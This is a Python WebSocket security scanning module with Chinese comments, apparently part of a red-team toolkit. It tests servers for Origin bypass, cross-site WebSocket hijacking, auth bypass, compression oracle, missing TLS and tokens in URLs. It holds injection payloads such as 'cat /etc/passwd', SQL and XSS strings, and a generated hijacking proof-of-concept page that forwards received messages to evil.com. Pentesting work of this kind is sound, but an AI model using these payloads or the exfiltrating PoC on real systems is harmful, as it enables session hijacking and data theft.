#!/usr/bin/env python3
"""
WebSocket安全测试模块
功能: Origin检查绕过、跨站WebSocket劫持(CSWSH)、消息注入、认证绕过
作者: AutoRedTeam
"""

import base64
import hashlib
import logging
import os
import re
import socket
import ssl
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class WSVulnType(Enum):
    """WebSocket漏洞类型"""

    ORIGIN_BYPASS = "origin_check_bypass"  # Origin检查绕过
    CSWSH = "cross_site_websocket_hijacking"  # 跨站WebSocket劫持
    AUTH_BYPASS = "auth_bypass"  # 认证绕过
    MESSAGE_INJECTION = "message_injection"  # 消息注入
    COMPRESSION_ORACLE = "compression_oracle"  # CRIME压缩攻击
    NO_TLS = "no_tls"  # 未使用TLS
    TOKEN_LEAK = "token_in_url"  # URL中的Token泄露


@dataclass
class WSTestResult:
    """WebSocket测试结果"""

    vuln_type: WSVulnType
    severity: str
    description: str
    proof: str = ""
    exploitable: bool = False


@dataclass
class WSConnectionInfo:
    """WebSocket连接信息"""

    url: str
    connected: bool = False
    protocol: str = ""
    extensions: List[str] = field(default_factory=list)
    response_headers: Dict[str, str] = field(default_factory=dict)
    error: str = ""


class WebSocketSecurityTester:
    """WebSocket安全测试器"""

    # Origin绕过Payloads
    ORIGIN_BYPASS_PAYLOADS = [
        ("", "空Origin"),
        ("null", "null Origin"),
        ("http://evil.com", "外部域名"),
        ("http://localhost", "localhost"),
        ("http://127.0.0.1", "本地IP"),
        ("file://", "file协议"),
    ]

    # WebSocket消息注入Payloads
    WS_INJECTION_PAYLOADS = [
        # 权限提升
        ('{"action":"admin","data":"test"}', "admin action"),
        ('{"type":"SUBSCRIBE","channel":"admin"}', "admin channel"),
        ('{"role":"admin"}', "role elevation"),
        # 原型污染
        ('{"__proto__":{"admin":true}}', "prototype pollution"),
        ('{"constructor":{"prototype":{"admin":true}}}', "constructor pollution"),
        # 命令注入
        ('{"cmd":"id"}', "command injection"),
        ('{"exec":"cat /etc/passwd"}', "exec injection"),
        # SQL注入
        ("{\"id\":\"1' OR '1'='1\"}", "SQL injection"),
        # XSS
        ('{"msg":"<script>alert(1)</script>"}', "XSS payload"),
    ]

    # WebSocket魔数
    WS_MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    def __init__(self, timeout: float = 10.0, proxy: Optional[str] = None):
        """
        初始化WebSocket测试器

        Args:
            timeout: 连接超时时间
            proxy: HTTP代理地址 (用于Upgrade请求)
        """
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def _parse_ws_url(self, url: str) -> Tuple[str, str, int, str, bool]:
        """
        解析WebSocket URL

        Returns:
            (scheme, host, port, path, is_secure)
        """
        parsed = urlparse(url)
        scheme = parsed.scheme.lower()
        is_secure = scheme == "wss"
        host = parsed.hostname or "localhost"
        port = parsed.port or (443 if is_secure else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        return scheme, host, port, path, is_secure

    def _generate_ws_key(self) -> str:
        """生成WebSocket密钥"""
        return base64.b64encode(os.urandom(16)).decode()

    def _compute_accept_key(self, key: str) -> str:
        """计算WebSocket Accept密钥"""
        concat = key + self.WS_MAGIC
        sha1 = hashlib.sha1(concat.encode()).digest()
        return base64.b64encode(sha1).decode()

    def _create_upgrade_request(
        self,
        host: str,
        path: str,
        port: int,
        origin: str = "",
        extra_headers: Optional[Dict] = None,
    ) -> Tuple[str, str]:
        """
        创建WebSocket升级请求

        Returns:
            (请求字符串, Sec-WebSocket-Key)
        """
        key = self._generate_ws_key()

        headers = [
            f"GET {path} HTTP/1.1",
            f"Host: {host}:{port}" if port not in [80, 443] else f"Host: {host}",
            "Upgrade: websocket",
            "Connection: Upgrade",
            f"Sec-WebSocket-Key: {key}",
            "Sec-WebSocket-Version: 13",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ]

        if origin:
            headers.append(f"Origin: {origin}")

        if extra_headers:
            for name, value in extra_headers.items():
                headers.append(f"{name}: {value}")

        headers.append("")
        headers.append("")

        return "\r\n".join(headers), key

    def _parse_http_response(self, data: bytes) -> Tuple[int, Dict[str, str], bytes]:
        """
        解析HTTP响应

        Returns:
            (状态码, 头部字典, 剩余数据)
        """
        try:
            header_end = data.find(b"\r\n\r\n")
            if header_end == -1:
                return 0, {}, data

            header_part = data[:header_end].decode("utf-8", errors="ignore")
            body_part = data[header_end + 4 :]

            lines = header_part.split("\r\n")
            status_line = lines[0]

            # 解析状态码
            match = re.match(r"HTTP/\d\.\d\s+(\d+)", status_line)
            status_code = int(match.group(1)) if match else 0

            # 解析头部
            headers = {}
            for line in lines[1:]:
                if ":" in line:
                    name, value = line.split(":", 1)
                    headers[name.strip().lower()] = value.strip()

            return status_code, headers, body_part

        except Exception as e:
            logger.error(f"解析响应失败: {e}")
            return 0, {}, data

    def _try_ws_connect(
        self, url: str, origin: str = "", extra_headers: Optional[Dict] = None
    ) -> WSConnectionInfo:
        """
        尝试WebSocket连接

        Returns:
            连接信息
        """
        result = WSConnectionInfo(url=url)

        try:
            scheme, host, port, path, is_secure = self._parse_ws_url(url)

            # 创建Socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if is_secure:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))

            # 发送升级请求
            request, key = self._create_upgrade_request(host, path, port, origin, extra_headers)
            sock.sendall(request.encode())

            # 接收响应
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
                if b"\r\n\r\n" in response_data:
                    break

            sock.close()

            # 解析响应
            status_code, headers, _ = self._parse_http_response(response_data)

            result.response_headers = headers

            # 检查101 Switching Protocols
            if status_code == 101:
                result.connected = True

                # 验证Accept Key
                expected_accept = self._compute_accept_key(key)
                actual_accept = headers.get("sec-websocket-accept", "")

                if actual_accept != expected_accept:
                    result.error = "Accept key不匹配"
                    result.connected = False

                # 获取扩展
                extensions = headers.get("sec-websocket-extensions", "")
                if extensions:
                    result.extensions = [e.strip() for e in extensions.split(",")]

                result.protocol = headers.get("sec-websocket-protocol", "")

            else:
                result.error = f"HTTP {status_code}"

        except socket.timeout:
            result.error = "连接超时"
        except ConnectionRefusedError:
            result.error = "连接被拒绝"
        except Exception as e:
            result.error = str(e)

        return result

    def test_origin_bypass(
        self, url: str, target_origin: str = "", extra_headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        测试Origin检查绕过

        Args:
            url: WebSocket URL
            target_origin: 目标网站Origin (用于构造绕过Payload)
            extra_headers: 额外的HTTP头
        """
        result = {
            "vulnerable": False,
            "vuln_type": "origin_check_bypass",
            "severity": "high",
            "description": "WebSocket未正确验证Origin头",
            "tests": [],
            "accepted_origins": [],
            "remediation": "在服务端严格验证Origin头,使用白名单机制",
        }

        # 添加目标相关的绕过尝试
        payloads = list(self.ORIGIN_BYPASS_PAYLOADS)

        if target_origin:
            parsed = urlparse(target_origin)
            target_host = parsed.netloc

            payloads.extend(
                [
                    (f"http://{target_host}.evil.com", "子域名后缀绕过"),
                    (f"http://evil.{target_host}", "子域名前缀绕过"),
                    (f"http://{target_host}@evil.com", "用户信息绕过"),
                ]
            )

        for origin, desc in payloads:
            conn = self._try_ws_connect(url, origin, extra_headers)

            test_result = {
                "origin": origin,
                "description": desc,
                "connected": conn.connected,
                "error": conn.error,
            }
            result["tests"].append(test_result)

            if conn.connected:
                result["vulnerable"] = True
                result["accepted_origins"].append(origin if origin else "(空Origin)")

        if result["vulnerable"]:
            result["proof"] = f"服务器接受了以下Origin: {', '.join(result['accepted_origins'])}"

        return result

    def test_cswsh(
        self, url: str, target_origin: str, extra_headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        测试跨站WebSocket劫持 (CSWSH)
        """
        result = {
            "vulnerable": False,
            "vuln_type": "cross_site_websocket_hijacking",
            "severity": "high",
            "description": "WebSocket可能遭受跨站劫持攻击",
            "poc_html": "",
            "remediation": "实施CSRF Token验证,严格检查Origin",
        }

        # 使用攻击者Origin尝试连接
        attacker_origin = "https://evil.com"
        conn = self._try_ws_connect(url, attacker_origin, extra_headers)

        if conn.connected:
            result["vulnerable"] = True
            result["proof"] = f"攻击者Origin({attacker_origin})可以建立WebSocket连接"

            # 生成PoC
            result["poc_html"] = self._generate_cswsh_poc(url, target_origin)

        return result

    def _generate_cswsh_poc(self, ws_url: str, target_origin: str) -> str:
        """生成CSWSH PoC HTML"""
        poc = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC</title>
</head>
<body>
    <h1>Cross-Site WebSocket Hijacking PoC</h1>
    <div id="log"></div>

    <script>
        var ws = new WebSocket("{ws_url}");

        ws.onopen = function() {{
            log("Connected!");
            // 发送测试消息
            ws.send('{{"type":"ping"}}');
        }};

        ws.onmessage = function(event) {{
            log("Received: " + event.data);
            // 将数据发送到攻击者服务器
            fetch("https://evil.com/collect", {{
                method: "POST",
                body: event.data
            }});
        }};

        ws.onerror = function(error) {{
            log("Error: " + error);
        }};

        function log(msg) {{
            document.getElementById("log").innerHTML += msg + "<br>";
        }}
    </script>
</body>
</html>
"""
        return poc.strip()

    def test_compression_oracle(
        self, url: str, extra_headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        测试CRIME压缩攻击 (permessage-deflate)
        """
        result = {
            "vulnerable": False,
            "vuln_type": "compression_oracle",
            "severity": "medium",
            "description": "WebSocket启用压缩可能遭受CRIME类攻击",
            "compression_enabled": False,
            "extensions": [],
            "remediation": "对于敏感数据传输,考虑禁用WebSocket压缩",
        }

        # 请求启用压缩
        headers = extra_headers.copy() if extra_headers else {}
        headers["Sec-WebSocket-Extensions"] = "permessage-deflate"

        conn = self._try_ws_connect(url, "", headers)

        if conn.connected:
            result["extensions"] = conn.extensions

            # 检查是否启用了压缩
            for ext in conn.extensions:
                if "deflate" in ext.lower():
                    result["vulnerable"] = True
                    result["compression_enabled"] = True
                    result["proof"] = f"服务器接受了压缩扩展: {ext}"
                    break

        return result

    def test_no_tls(self, url: str) -> Dict[str, Any]:
        """
        测试是否使用TLS
        """
        result = {
            "vulnerable": False,
            "vuln_type": "no_tls",
            "severity": "high",
            "description": "WebSocket未使用TLS加密",
            "scheme": "",
            "remediation": "使用wss://协议替代ws://",
        }

        scheme, _, _, _, is_secure = self._parse_ws_url(url)
        result["scheme"] = scheme

        if not is_secure:
            result["vulnerable"] = True
            result["proof"] = f"使用了不安全的{scheme}://协议"

        return result

    def test_token_in_url(self, url: str) -> Dict[str, Any]:
        """
        测试URL中是否包含敏感Token
        """
        result = {
            "vulnerable": False,
            "vuln_type": "token_in_url",
            "severity": "medium",
            "description": "敏感Token通过URL参数传递",
            "found_params": [],
            "remediation": "使用WebSocket消息或HTTP头传递认证信息",
        }

        # 敏感参数名模式
        sensitive_patterns = [
            r"token",
            r"api_key",
            r"apikey",
            r"secret",
            r"password",
            r"pwd",
            r"auth",
            r"jwt",
            r"session",
            r"sid",
            r"access_token",
        ]

        parsed = urlparse(url)
        query = parsed.query

        if query:
            for pattern in sensitive_patterns:
                matches = re.findall(rf"({pattern}[=][^&]+)", query, re.IGNORECASE)
                if matches:
                    result["vulnerable"] = True
                    result["found_params"].extend(matches)

        if result["vulnerable"]:
            result["found_params"] = list(set(result["found_params"]))
            result["proof"] = f"URL中发现敏感参数: {', '.join(result['found_params'])}"

        return result

    def test_auth_bypass(
        self, url: str, auth_token: str = "", extra_headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        测试认证绕过

        尝试不带认证信息连接
        """
        result = {
            "vulnerable": False,
            "vuln_type": "auth_bypass",
            "severity": "high",
            "description": "WebSocket未要求认证或认证可绕过",
            "tests": [],
            "remediation": "实施强制认证,验证每个连接的凭证",
        }

        # 测试1: 完全不带认证
        conn1 = self._try_ws_connect(url, "", None)
        result["tests"].append({"description": "无认证连接", "connected": conn1.connected})

        if conn1.connected:
            result["vulnerable"] = True
            result["proof"] = "可以无认证建立WebSocket连接"

        # 测试2: 带无效Token
        if auth_token:
            invalid_headers = extra_headers.copy() if extra_headers else {}
            invalid_headers["Authorization"] = "Bearer invalid_token_12345"

            conn2 = self._try_ws_connect(url, "", invalid_headers)
            result["tests"].append({"description": "无效Token连接", "connected": conn2.connected})

            if conn2.connected:
                result["vulnerable"] = True
                result["proof"] = "使用无效Token可以建立WebSocket连接"

        return result

    def full_scan(
        self, url: str, target_origin: str = "", extra_headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        完整WebSocket安全扫描
        """
        result = {
            "url": url,
            "vulnerabilities": [],
            "tests": {},
            "summary": {"total_tests": 0, "vulnerable_count": 0, "highest_severity": "none"},
            "recommendations": [],
        }

        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}
        highest_severity = "none"

        # 执行所有测试
        tests = [
            ("no_tls", lambda: self.test_no_tls(url)),
            ("token_in_url", lambda: self.test_token_in_url(url)),
            ("origin_bypass", lambda: self.test_origin_bypass(url, target_origin, extra_headers)),
            ("cswsh", lambda: self.test_cswsh(url, target_origin, extra_headers)),
            ("compression_oracle", lambda: self.test_compression_oracle(url, extra_headers)),
            ("auth_bypass", lambda: self.test_auth_bypass(url, "", extra_headers)),
        ]

        for test_name, test_func in tests:
            try:
                test_result = test_func()
                result["tests"][test_name] = test_result
                result["summary"]["total_tests"] += 1

                if test_result.get("vulnerable"):
                    result["summary"]["vulnerable_count"] += 1
                    severity = test_result.get("severity", "low")

                    if severity_order.get(severity, 0) > severity_order.get(highest_severity, 0):
                        highest_severity = severity

                    result["vulnerabilities"].append(
                        {
                            "type": test_name,
                            "severity": severity,
                            "proof": test_result.get("proof", ""),
                            "remediation": test_result.get("remediation", ""),
                        }
                    )

                    if test_result.get("remediation"):
                        result["recommendations"].append(test_result["remediation"])

            except Exception as e:
                logger.error(f"测试{test_name}失败: {e}")
                result["tests"][test_name] = {"error": str(e)}

        result["summary"]["highest_severity"] = highest_severity
        result["recommendations"] = list(set(result["recommendations"]))

        return result


# 便捷函数
def quick_websocket_scan(url: str) -> Dict[str, Any]:
    """快速WebSocket安全扫描"""
    tester = WebSocketSecurityTester()
    return tester.full_scan(url)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    # 测试示例
    test_url = "wss://example.com/ws"

    tester = WebSocketSecurityTester()

    # 测试TLS
    result = tester.test_no_tls(test_url)
    logger.info(f"No TLS vulnerable: {result.get('vulnerable')}")
